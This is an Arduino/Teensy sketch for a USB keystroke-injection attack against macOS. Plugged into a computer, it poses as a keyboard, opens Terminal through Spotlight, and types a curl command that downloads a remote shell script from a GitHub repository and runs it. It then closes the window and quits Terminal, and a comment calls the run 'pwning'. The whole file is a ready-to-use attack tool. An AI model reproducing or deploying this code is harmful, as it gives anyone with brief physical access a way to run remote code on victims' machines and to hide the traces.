// delay ms
int ds = 500;
int LED_PIN = 13;

void setup() {
  // give us a little time to connect up
  delay(1000);
  
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open Terminal
  openapp("Terminal");
  delay(ds * 2);
  
  // attempt to kill anything that may be running
  cmd(KEY_N);

  typeln("sh -c \"$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/go.sh)\"");

  cmd(KEY_W);
  cmd(KEY_Q);
  Keyboard.println("");
  // turn off led when done
  digitalWrite(LED_PIN, LOW);
}

void loop() {
  
}

// custom functions


void typeln(String chars){
  Keyboard.print(chars);
    delay(50);
  Keyboard.println("");
    delay(50);
}

void openapp(String app){
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}

void ctrl(int key){
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key){
  mod(MODIFIERKEY_GUI, key);
}

void mod(int mod, int key){
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}
